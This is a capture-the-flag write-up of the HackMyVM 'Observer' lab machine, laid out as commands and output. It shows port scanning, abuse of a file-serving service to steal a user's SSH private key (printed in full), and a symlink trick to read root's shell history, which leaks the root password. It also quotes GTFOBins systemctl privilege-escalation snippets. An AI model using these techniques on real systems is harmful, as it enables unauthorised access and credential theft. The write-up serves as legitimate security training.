# CTF Penetration Testing

## HackMyVM

### Observer - Machine

#### Machine Description

- Machine name: [Observer](https://hackmyvm.eu/machines/machine.php?vm=Observer)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/observer.png" alt="Observer Machine Logo" width="150"/>

#### Tools Used

- ffuf
- Netcat
- Nmap

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.119  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.119
192.168.56.122 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.122`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 15:48 EDT
Nmap scan report for 192.168.56.122
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0) ←
3333/tcp open  dec-notes? ←
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.94SVN%I=7%D=9/23%Time=66F1C62B%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\n
SF:Date:\x20Mon,\x2023\x20Sep\x202024\x2019:49:09\x20GMT\r\nContent-Length
SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20XVlBzgbaiCMRAjWw
SF:hTHctcuAxhxKQFHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\n
SF:Date:\x20Mon,\x2023\x20Sep\x202024\x2019:49:09\x20GMT\r\nContent-Length
SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20DaFpLSjFbcXoEFfR
SF:sWxPLDnJObCsNVHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Te
SF:rminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,DF
SF:,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20Sep\x202024\x2019:49
SF::34\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x20ports,/Trinit
SF:y\.txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQleQYhYzRyWJjPjzp
SF:fRFEHMV\x20-->");
MAC Address: 08:00:27:A6:FD:FA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.72 seconds
```

`nc 192.168.56.122 3333`:
```
TEST ←
HTTP/1.1 400 Bad Request ←
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request    
```

`curl http://192.168.56.122:3333 -s`:
``` 
OBSERVING FILE: /home/ NOT EXIST ←


* Connection #0 to host 192.168.56.122 left intact
<!-- lfjbSbGtlMQdOzzUEDXZXjymkGMWiOHMV --> 
```

`curl http://192.168.56.122:3333/TEST -s`:
```
OBSERVING FILE: /home/TEST NOT EXIST ←


* Connection #0 to host 192.168.56.122 left intact
<!-- RUBxaPStfraKIKdSZEMTANFTBlXBDoHMV -->          
```

`curl "http://192.168.56.122:3333/%2E%2E/" -s`:
```
<a href="/">Moved Permanently</a>. ←

* Connection #0 to host 192.168.56.122 left intact
```

`curl "http://192.168.56.122:3333/%2E%2E/etc" -s`:
```
<a href="/etc">Moved Permanently</a>. ←

* Connection #0 to host 192.168.56.122 left intact
```
❌ Failed Step.

`ffuf -u http://192.168.56.122:3333/USERNAME -w /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt:USERNAME -t 100 -fr "NOT EXIST"`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.122:3333/USERNAME
 :: Wordlist         : USERNAME: /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: NOT EXIST
________________________________________________

[...]
```

`ffuf -u http://192.168.56.122:3333/USERNAME/.bashrc -w /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt:USERNAME -t 100 -fr "NOT EXIST"`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.122:3333/USERNAME/.bashrc
 :: Wordlist         : USERNAME: /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: NOT EXIST
________________________________________________

jan                     [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 48ms] ←

[...]
```

`curl "http://192.168.56.122:3333/jan/.bashrc" -s`:
```  
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

[...]
```

`curl "http://192.168.56.122:3333/jan/.ssh/id_rsa" -s`:
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

`curl "http://192.168.56.122:3333/jan/.ssh/id_rsa" -s > /tmp/id_rsa`

`chmod 600 /tmp/id_rsa`

`ssh -i /tmp/id_rsa jan@192.168.56.122`:
```
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
```

![Victim: jan](https://img.shields.io/badge/Victim-jan-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
jan ←
```

`uname -a`:
```
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`cd /home/jan`

`ls -alps`:
```
total 40
4 drwx------ 4 jan  jan  4096 ago 21  2023 ./
4 drwxr-xr-x 3 root root 4096 ago 21  2023 ../
4 -rw------- 1 jan  jan   133 ago 21  2023 .bash_history
4 -rw-r--r-- 1 jan  jan   220 ago 21  2023 .bash_logout
4 -rw-r--r-- 1 jan  jan  3526 ago 21  2023 .bashrc
4 drwxr-xr-x 3 jan  jan  4096 ago 21  2023 .local/
4 -rw-r--r-- 1 jan  jan   807 ago 21  2023 .profile
4 drwx------ 2 jan  jan  4096 ago 21  2023 .ssh/
4 -rw------- 1 jan  jan    24 ago 21  2023 user.txt ←
4 -rw------- 1 jan  jan    54 ago 21  2023 .Xauthority
```

`cat ./user.txt`:
```
HMVdDepYxsi8VSucdruB3P7 ←
```

`sudo -l`:
```
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status ←
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[systemctl](https://gtfobins.github.io/gtfobins/systemctl)

[**#Sudo**]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
1. 
```
TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
```
2. 
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```
3. This invokes the default pager, which is likely to be [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply.
    ```
    sudo systemctl
    !/bin/sh
    ```

`sudo /usr/bin/systemctl -l status`

`!`:
```
Command not available (press RETURN)
```
❌ Failed Step.

`/usr/bin/systemctl -l status`:
```
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Tue 2024-09-24 11:09:38 CEST; 2h 13min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─304 /usr/sbin/cron -f
           │ │ ├─320 /usr/sbin/CRON -f
           │ │ ├─328 /bin/sh -c /opt/observer ←
           │ │ └─331 /opt/observer
           │ ├─dbus.service
           │ │ └─311 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
           │ ├─ifup@enp0s3.service
           │ │ └─329 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
           │ ├─ssh.service
           │ │ └─434 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
           │ ├─system-getty.slice
           │ │ └─getty@tty1.service
           │ │   └─380 /sbin/agetty -o "-p -- \\u" --noclear - linux
           │ ├─systemd-journald.service
           │ │ └─207 /lib/systemd/systemd-journald
           │ ├─systemd-logind.service
           │ │ └─315 /lib/systemd/systemd-logind
           │ ├─systemd-timesyncd.service
           │ │ └─247 /lib/systemd/systemd-timesyncd
           │ └─systemd-udevd.service
           │   └─udev
           │     └─235 /lib/systemd/systemd-udevd
           └─user.slice
             └─user-1000.slice
               ├─session-4.scope
               │ ├─585 "sshd: jan [priv]"
               │ ├─601 "sshd: jan@pts/0"
               │ ├─602 -bash
               │ ├─792 /usr/bin/systemctl -l status
               │ └─793 pager
               └─user@1000.service
                 └─init.scope
                   ├─589 /lib/systemd/systemd --user
                   └─591 "(sd-pam)"
```

`ls -l /opt/observer`:
```
-rwxr-xr-x 1 root root 7376728 ago 21  2023 /opt/observer ←
```

`file /opt/observer`:
```
/opt/observer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=_E9thk92IIYCZvNN3nMp/723mDp4suP4oBkI9Ztww/FPlVJZMU8XbDS3SsBTeA/jXmNFAfWVvPiDjPPa-TB, not stripped
```

`python3 -m http.server 8080 -d /opt`:
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`wget http://192.168.56.122:8080/observer`:
```
--2024-09-24 08:51:48--  http://192.168.56.122:8080/observer
Connecting to 192.168.56.122:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7376728 (7.0M) [application/octet-stream]
Saving to: ‘observer’

observer                                       100%[====================================================================================================>]   7.03M  38.7MB/s    in 0.2s    

2024-09-24 08:51:48 (38.7 MB/s) - ‘observer’ saved [7376728/7376728] ←
```

`chmod u+x ./observer`

`./observer`

`netstat -antp`:
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:39055         0.0.0.0:*               LISTEN      761/containerd      
tcp        0      0 192.168.56.118:59028    192.168.56.122:22       ESTABLISHED 45381/ssh           
tcp6       0      0 :::3333 ←               :::*                    LISTEN      112843/./observer ←
```

`curl localhost:3333`:
```            
OBSERVING FILE: /home/ NOT EXIST 


<!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->   
```

`curl localhost:3333/kali/.bashrc`:
```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

[...]
```

![Victim: jan](https://img.shields.io/badge/Victim-jan-64b5f6?logo=linux&logoColor=white)

`ln -s /root root_link`

`ls -alps`:
```
total 44
4 drwx------ 4 jan  jan  4096 sep 24 15:33 ./
4 drwxr-xr-x 3 root root 4096 ago 21  2023 ../
4 -rw------- 1 jan  jan   133 ago 21  2023 .bash_history
4 -rw-r--r-- 1 jan  jan   220 ago 21  2023 .bash_logout
4 -rw-r--r-- 1 jan  jan  3526 ago 21  2023 .bashrc
4 -rw------- 1 jan  jan    20 sep 24 13:27 .lesshst
4 drwxr-xr-x 3 jan  jan  4096 ago 21  2023 .local/
4 -rw-r--r-- 1 jan  jan   807 ago 21  2023 .profile
0 lrwxrwxrwx 1 jan  jan     5 sep 24 15:33 root_link -> /root/ ←
4 drwx------ 2 jan  jan  4096 ago 21  2023 .ssh/
4 -rw------- 1 jan  jan    24 ago 21  2023 user.txt
4 -rw------- 1 jan  jan    54 ago 21  2023 .Xauthority
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`curl "http://192.168.56.122:3333/jan/root_link/.bashrc" -s`:
```
# ~/.bashrc: executed by bash(1) for non-login shells.

# Note: PS1 and umask are already set in /etc/profile. You should not
# need this unless you want different defaults for root.
# PS1='${debian_chroot:+($debian_chroot)}\h:\w\$ '
# umask 022

# You may uncomment the following lines if you want `ls' to be colorized:
# export LS_OPTIONS='--color=auto'
# eval "$(dircolors)"
# alias ls='ls $LS_OPTIONS'
# alias ll='ls $LS_OPTIONS -l'
# alias l='ls $LS_OPTIONS -lA'
#
# Some more alias to avoid making mistakes:
# alias rm='rm -i'
# alias cp='cp -i'
# alias mv='mv -i'
```

`curl "http://192.168.56.122:3333/jan/root_link/.bash_history" -s`:
```
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go 
mv observer /opt
ls -l /opt/observer 
crontab -e
nano root.txt
chmod 600 root.txt 
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd ←
fuck1ng0bs3rv3rs ←
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt 
cd /home/jan
ls -la
cat user.txt 
su jan
reboot
shutdown -h now
whoami
cd /root
ls
ls -alps
cat ./root.txt 
exit
```

![Victim: jan](https://img.shields.io/badge/Victim-jan-64b5f6?logo=linux&logoColor=white)

`su root`:
```
Contraseña: ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`cd /root`

`ls -alps`:
```
total 52
4 drwx------  5 root root 4096 sep 24 14:13 ./
4 drwxr-xr-x 18 root root 4096 ago 21  2023 ../
4 -rw-------  1 root root  633 ago 21  2023 .bash_history
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 ago 21  2023 .cache/
4 -rw-------  1 root root   40 sep 24 14:13 .lesshst
4 drwxr-xr-x  3 root root 4096 ago 21  2023 .local/
4 -rw-r--r--  1 root root  913 ago 21  2023 observer.go
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   24 ago 21  2023 root.txt ←
4 -rw-r--r--  1 root root   66 ago 21  2023 .selected_editor
4 drwx------  2 root root 4096 ago 21  2023 .ssh/
4 -rw-r--r--  1 root root  161 ago 21  2023 .wget-hsts
```

`cat ./root.txt`:
```
HMVb6MPDxdYLLC3sxNLIOH1 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
